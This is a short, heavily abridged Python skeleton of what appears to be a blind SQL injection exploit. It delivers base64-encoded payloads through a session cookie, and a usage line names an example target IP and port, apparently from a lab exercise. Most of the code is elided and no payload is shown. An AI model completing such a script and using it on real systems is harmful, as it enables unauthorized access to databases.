...
class cookie_bsqli:
	...
	def __send_payload(self, payload_fstr, pos, ch):
		...
		self.session.cookies.set(self.cookie_id, b64_cookie_payload, domain=re.split("//|:", parse_url(IP,PORT))[2])
...
if __name__ == '__main__':
    ...
    try :
        ...
        print("(+) Example: python3 %s 64.227.39.88 32730  " % sys.argv[0])
        sys.exit(-1)
